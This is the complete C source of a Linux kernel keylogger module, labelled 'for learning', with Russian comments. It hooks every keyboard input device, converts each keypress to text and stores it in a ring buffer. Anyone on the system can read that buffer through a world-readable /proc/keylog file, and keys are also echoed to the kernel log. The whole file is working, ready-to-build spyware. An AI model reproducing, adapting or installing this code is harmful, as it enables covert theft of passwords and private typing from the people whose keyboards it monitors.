#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/uaccess.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Polyakov Andrei");
MODULE_DESCRIPTION("Keyboard event interceptor for learning");
MODULE_VERSION("1.0");

#define PROC_NAME "keylog"
#define BUFFER_SIZE 4096

/* Кольцевой буфер для хранения клавиш */
static char *key_buffer;
static int buffer_head = 0;
static int buffer_tail = 0;
static int buffer_count = 0;

/* Spinlock для защиты буфера */
static DEFINE_SPINLOCK(buffer_lock);

/* Proc entry */
static struct proc_dir_entry *proc_entry;

/* Input handler */
static struct input_handler keylog_handler;

/* Таблица конвертации key codes в символы (упрощенная) */
static const char *keycode_to_string[] = {
    [KEY_RESERVED] = "",
    [KEY_ESC] = "[ESC]",
    [KEY_1] = "1", [KEY_2] = "2", [KEY_3] = "3", [KEY_4] = "4",
    [KEY_5] = "5", [KEY_6] = "6", [KEY_7] = "7", [KEY_8] = "8",
    [KEY_9] = "9", [KEY_0] = "0",
    [KEY_MINUS] = "-", [KEY_EQUAL] = "=",
    [KEY_BACKSPACE] = "[BACKSPACE]",
    [KEY_TAB] = "[TAB]",
    [KEY_Q] = "q", [KEY_W] = "w", [KEY_E] = "e", [KEY_R] = "r",
    [KEY_T] = "t", [KEY_Y] = "y", [KEY_U] = "u", [KEY_I] = "i",
    [KEY_O] = "o", [KEY_P] = "p",
    [KEY_LEFTBRACE] = "[", [KEY_RIGHTBRACE] = "]",
    [KEY_ENTER] = "[ENTER]\n",
    [KEY_LEFTCTRL] = "[CTRL]", [KEY_RIGHTCTRL] = "[CTRL]",
    [KEY_A] = "a", [KEY_S] = "s", [KEY_D] = "d", [KEY_F] = "f",
    [KEY_G] = "g", [KEY_H] = "h", [KEY_J] = "j", [KEY_K] = "k",
    [KEY_L] = "l",
    [KEY_SEMICOLON] = ";", [KEY_APOSTROPHE] = "'",
    [KEY_GRAVE] = "`",
    [KEY_LEFTSHIFT] = "[SHIFT]", [KEY_RIGHTSHIFT] = "[SHIFT]",
    [KEY_BACKSLASH] = "\\",
    [KEY_Z] = "z", [KEY_X] = "x", [KEY_C] = "c", [KEY_V] = "v",
    [KEY_B] = "b", [KEY_N] = "n", [KEY_M] = "m",
    [KEY_COMMA] = ",", [KEY_DOT] = ".", [KEY_SLASH] = "/",
    [KEY_SPACE] = " ",
    [KEY_LEFTALT] = "[ALT]", [KEY_RIGHTALT] = "[ALT]",
    [KEY_CAPSLOCK] = "[CAPS]",
    [KEY_F1] = "[F1]", [KEY_F2] = "[F2]", [KEY_F3] = "[F3]",
    [KEY_F4] = "[F4]", [KEY_F5] = "[F5]", [KEY_F6] = "[F6]",
    [KEY_F7] = "[F7]", [KEY_F8] = "[F8]", [KEY_F9] = "[F9]",
    [KEY_F10] = "[F10]", [KEY_F11] = "[F11]", [KEY_F12] = "[F12]",
    [KEY_DELETE] = "[DEL]",
    [KEY_HOME] = "[HOME]", [KEY_END] = "[END]",
    [KEY_PAGEUP] = "[PGUP]", [KEY_PAGEDOWN] = "[PGDN]",
    [KEY_LEFT] = "[LEFT]", [KEY_RIGHT] = "[RIGHT]",
    [KEY_UP] = "[UP]", [KEY_DOWN] = "[DOWN]",
};

#define MAX_KEYCODE (sizeof(keycode_to_string) / sizeof(keycode_to_string[0]))

/* Добавление строки в кольцевой буфер */
static void add_to_buffer(const char *str)
{
    unsigned long flags;
    int len = strlen(str);
    int i;

    spin_lock_irqsave(&buffer_lock, flags);

    for (i = 0; i < len; i++) {
        key_buffer[buffer_head] = str[i];
        buffer_head = (buffer_head + 1) % BUFFER_SIZE;
        
        if (buffer_count < BUFFER_SIZE) {
            buffer_count++;
        } else {
            /* Буфер полон, сдвигаем tail */
            buffer_tail = (buffer_tail + 1) % BUFFER_SIZE;
        }
    }

    spin_unlock_irqrestore(&buffer_lock, flags);
}

/* Callback для обработки событий клавиатуры */
static void keylog_event(struct input_handle *handle, unsigned int type,
                         unsigned int code, int value)
{
    /* Обрабатываем только нажатия клавиш (value == 1) */
    if (type == EV_KEY && value == 1) {
        if (code < MAX_KEYCODE && keycode_to_string[code]) {
            add_to_buffer(keycode_to_string[code]);
            printk(KERN_DEBUG "keylogger: Key pressed: %s (code: %u)\n",
                   keycode_to_string[code], code);
        } else {
            /* Неизвестная клавиша */
            char buf[16];
            snprintf(buf, sizeof(buf), "[%u]", code);
            add_to_buffer(buf);
        }
    }
}

/* Connect к input device */
static int keylog_connect(struct input_handler *handler,
                          struct input_dev *dev,
                          const struct input_device_id *id)
{
    struct input_handle *handle;
    int error;

    /* Проверяем, что это клавиатура */
    if (!test_bit(EV_KEY, dev->evbit))
        return -ENODEV;

    handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
    if (!handle)
        return -ENOMEM;

    handle->dev = dev;
    handle->handler = handler;
    handle->name = "keylogger";

    error = input_register_handle(handle);
    if (error) {
        printk(KERN_ERR "keylogger: Failed to register handle\n");
        kfree(handle);
        return error;
    }

    error = input_open_device(handle);
    if (error) {
        printk(KERN_ERR "keylogger: Failed to open device\n");
        input_unregister_handle(handle);
        kfree(handle);
        return error;
    }

    printk(KERN_INFO "keylogger: Connected to device: %s\n", dev->name);
    return 0;
}

/* Disconnect от input device */
static void keylog_disconnect(struct input_handle *handle)
{
    printk(KERN_INFO "keylogger: Disconnecting from device\n");
    input_close_device(handle);
    input_unregister_handle(handle);
    kfree(handle);
}

/* ID таблица для клавиатур */
static const struct input_device_id keylog_ids[] = {
    {
        .flags = INPUT_DEVICE_ID_MATCH_EVBIT,
        .evbit = { BIT_MASK(EV_KEY) },
    },
    { }, /* Terminator */
};

MODULE_DEVICE_TABLE(input, keylog_ids);

/* Чтение из /proc/keylog */
static ssize_t keylog_read(struct file *file, char __user *buf,
                           size_t count, loff_t *ppos)
{
    unsigned long flags;
    char *temp_buf;
    int i, len = 0;
    int buf_pos;
    ssize_t ret;

    if (*ppos > 0)
        return 0;

    temp_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);
    if (!temp_buf)
        return -ENOMEM;

    spin_lock_irqsave(&buffer_lock, flags);

    /* Копируем данные из кольцевого буфера */
    if (buffer_count > 0) {
        buf_pos = buffer_tail;
        for (i = 0; i < buffer_count && len < BUFFER_SIZE - 1; i++) {
            temp_buf[len++] = key_buffer[buf_pos];
            buf_pos = (buf_pos + 1) % BUFFER_SIZE;
        }
    }
    temp_buf[len] = '\0';

    spin_unlock_irqrestore(&buffer_lock, flags);

    /* Копируем в userspace */
    if (len > count)
        len = count;

    ret = len;
    if (copy_to_user(buf, temp_buf, len))
        ret = -EFAULT;
    else
        *ppos = len;

    kfree(temp_buf);
    return ret;
}

/* Proc file operations для ядра 5.6+ */
static const struct proc_ops keylog_proc_ops = {
    .proc_read = keylog_read,
};

/* Инициализация модуля */
static int __init keylogger_init(void)
{
    int error;

    printk(KERN_INFO "keylogger: Initializing keylogger module\n");

    /* Выделяем память для буфера */
    key_buffer = kzalloc(BUFFER_SIZE, GFP_KERNEL);
    if (!key_buffer) {
        printk(KERN_ERR "keylogger: Failed to allocate buffer\n");
        return -ENOMEM;
    }

    /* Создаем /proc entry */
    proc_entry = proc_create(PROC_NAME, 0444, NULL, &keylog_proc_ops);
    if (!proc_entry) {
        printk(KERN_ERR "keylogger: Failed to create /proc entry\n");
        kfree(key_buffer);
        return -ENOMEM;
    }

    /* Настраиваем input handler */
    keylog_handler.event = keylog_event;
    keylog_handler.connect = keylog_connect;
    keylog_handler.disconnect = keylog_disconnect;
    keylog_handler.name = "keylogger";
    keylog_handler.id_table = keylog_ids;

    /* Регистрируем handler */
    error = input_register_handler(&keylog_handler);
    if (error) {
        printk(KERN_ERR "keylogger: Failed to register handler\n");
        proc_remove(proc_entry);
        kfree(key_buffer);
        return error;
    }

    printk(KERN_INFO "keylogger: Module loaded successfully\n");
    printk(KERN_INFO "keylogger: Read logs with: cat /proc/%s\n", PROC_NAME);

    return 0;
}

/* Выгрузка модуля */
static void __exit keylogger_exit(void)
{
    printk(KERN_INFO "keylogger: Unloading keylogger module\n");

    /* Отменяем регистрацию handler */
    input_unregister_handler(&keylog_handler);

    /* Удаляем /proc entry */
    if (proc_entry)
        proc_remove(proc_entry);

    /* Освобождаем буфер */
    if (key_buffer)
        kfree(key_buffer);

    printk(KERN_INFO "keylogger: Module unloaded successfully\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);
